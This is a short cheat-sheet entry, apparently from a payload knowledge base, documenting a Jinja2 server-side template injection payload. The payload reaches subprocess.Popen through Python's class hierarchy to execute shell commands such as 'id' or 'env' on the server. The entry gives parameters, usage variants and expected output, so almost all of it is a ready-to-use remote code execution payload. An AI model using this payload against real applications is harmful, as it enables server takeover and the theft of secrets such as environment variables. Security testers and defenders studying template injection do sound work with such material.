---
data: >-
  {{ ''.__class__.__mro__[1].__subclasses__()[292]('id', shell=True,
  stdout=-1).communicate() }}
tags:
  - rce
type: command
output: uid=... (command output)
executor: python
platforms:
  - Python
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:36.978Z'
id: d461ffe1-22f6-4dbd-82f7-b431816d8e00
verified: false
validated: true
submitted: true
---
# jinja2-execute-popen-command

## Command

```python
{{ ''.__class__.__mro__[1].__subclasses__()[292]('id', shell=True, stdout=-1).communicate() }}
```

## Description

Invokes subprocess.Popen via SSTI to execute a shell command and return its output.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| command | Shell cmd (e.g., 'id') | Yes |
| shell | True for shell mode | Yes |
| stdout | -1 for PIPE | Yes |
| index | Subclass index | Yes |

## Examples

### Basic Usage

```python
{{ ''.__class__.__mro__[1].__subclasses__()[292]('id', shell=True, stdout=-1).communicate() }}
```

### Advanced Usage

With 'env': replace 'id' with 'env'

## Expected Output

Tuple of (stdout, stderr), e.g., '(b'uid=1000...', None)'

## Related

- [[commands/id-shell]]
